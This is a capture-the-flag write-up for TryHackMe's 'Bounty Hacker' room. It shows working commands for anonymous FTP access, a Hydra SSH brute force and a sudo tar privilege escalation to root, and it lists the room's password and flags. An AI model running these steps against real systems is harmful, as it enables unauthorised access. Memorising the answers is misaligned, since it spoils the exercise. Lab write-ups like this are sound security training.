# 🤠 TryHackMe — Bounty Hacker

> **Room:** [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)  
> **Difficulty:** Easy  
> **Category:** Linux, Privilege Escalation  
> **Status:** ✅ Completed

---

## 🗺️ Overview

A beginner-friendly Linux box  involves anonymous FTP enumeration, SSH brute-forcing with a found wordlist, and a `tar`-based sudo privilege escalation to root.

---

## Task 1 - Deploy the Machine

Deploy the machine and confirm it's alive:

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ ping -c 5 10.49.134.171
PING 10.49.134.171 (10.49.134.171) 56(84) bytes of data.
64 bytes from 10.49.134.171: icmp_seq=1 ttl=62 time=264 ms
64 bytes from 10.49.134.171: icmp_seq=2 ttl=62 time=74.8 ms
64 bytes from 10.49.134.171: icmp_seq=3 ttl=62 time=119 ms
64 bytes from 10.49.134.171: icmp_seq=4 ttl=62 time=93.6 ms
64 bytes from 10.49.134.171: icmp_seq=5 ttl=62 time=128 ms

--- 10.49.134.171 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4003ms
rtt min/avg/max/mdev = 74.818/135.893/264.071/66.777 ms
```

✅ Host is up and reachable.

---

## Task 2 - Find Open Ports on the Machine

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ nmap -A -p- --min-rate 5000 10.49.134.171
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-15 16:42 EDT
Warning: 10.49.134.171 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.49.134.171
Host is up (0.15s latency).
Not shown: 57725 filtered tcp ports (no-response), 7807 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.185.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dd:84:b1:6c:92:c1:d4:07:89:8f:20:6b:e8:e0:bd:05 (RSA)
|   256 ec:b8:11:52:86:86:05:27:30:d7:18:78:cc:99:62:69 (ECDSA)
|_  256 26:dd:c2:49:37:7a:8f:32:c3:fc:98:f8:75:25:74:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Aggressive OS guesses: Linux 4.15 - 5.19 (90%), Linux 4.15 (89%), Linux 5.4 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 41392/tcp)
HOP RTT       ADDRESS
1   148.12 ms 192.168.128.1
2   ...
3   167.60 ms 10.49.134.171

Nmap done: 1 IP address (1 host up) scanned in 169.35 seconds
```

**Open Ports Found:**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.5 |
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | Apache 2.4.41 |

---

## Task 3 - Who Wrote the Task List?

Anonymous FTP login is enabled.

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ ftp 10.49.134.171
Connected to 10.49.134.171.
220 (vsFTPd 3.0.5)
Name (10.49.134.171:aashiq): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
l150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |************************************************************|   418      167.63 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (5.13 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |************************************************************|    68       44.38 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.83 KiB/s)
ftp> exit
221 Goodbye.
```

Reading the downloaded files:

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

The note in `task.txt` is signed by **lin** and that's our username.

> **Answer:** `lin`

---

## Task 4 - What Service Can You Bruteforce with the Text File Found?

`locks.txt` is a password wordlist. The username `lin` was found in `task.txt`. SSH is open on port 22, so we can bruteforce it with Hydra:

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ hydra -l lin -P /home/aashiq/Downloads/locks.txt ssh://10.49.134.171
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-15 16:47:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.49.134.171:22/
[22][ssh] host: 10.49.134.171   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-15 16:47:12
```

> **Answer:** `SSH`

---

## Task 5 — What Is the User's Password?

The Hydra output above reveals the valid credential:

```
[22][ssh] host: 10.49.134.171   login: lin   password: RedDr4gonSynd1cat3
```

> **Answer:** `RedDr4gonSynd1cat3`

---

## Task 6 - user.txt

SSH into the machine with the found credentials to grab the user flag:

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ ssh lin@10.49.134.171
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lin@10.49.134.171's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri May 15 15:32:49 2026 from 192.168.185.158
lin@ip-10-49-134-171:~/Desktop$ pwd
/home/lin/Desktop
lin@ip-10-49-134-171:~/Desktop$ ls -la
total 12
drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
lin@ip-10-49-134-171:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

> **Answer:** `THM{CR1M3_SyNd1C4T3}`

---

## Task 7 - To get root.txt

Check what sudo privileges `lin` has:

```bash
lin@ip-10-49-134-171:~/Desktop$ sudo -l
Matching Defaults entries for lin on ip-10-49-134-171:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-49-134-171:
    (root) /bin/tar
```

`/bin/tar` can be run as root. Using the [GTFOBins tar technique](https://gtfobins.github.io/gtfobins/tar/) to get into a root shell

```bash
lin@ip-10-49-134-171:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@ip-10-49-134-171:/home/lin/Desktop# whoami
root
root@ip-10-49-134-171:~# ls
root.txt  snap
root@ip-10-49-134-171:~# cat root.txt
THM{80UN7Y_h4cK3r}
```

> **Answer:** `THM{80UN7Y_h4cK3r}`

---


## 🛠️ Tools Used

- `ping` — Host discovery
- `nmap` — Port scanning & service enumeration
- `ftp` — Anonymous FTP access & file download
- `hydra` — SSH brute-force attack
- `ssh` — Remote login
- `sudo -l` + [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) (`tar`) — Privilege escalation to root

---

*Writeup by aashiq 
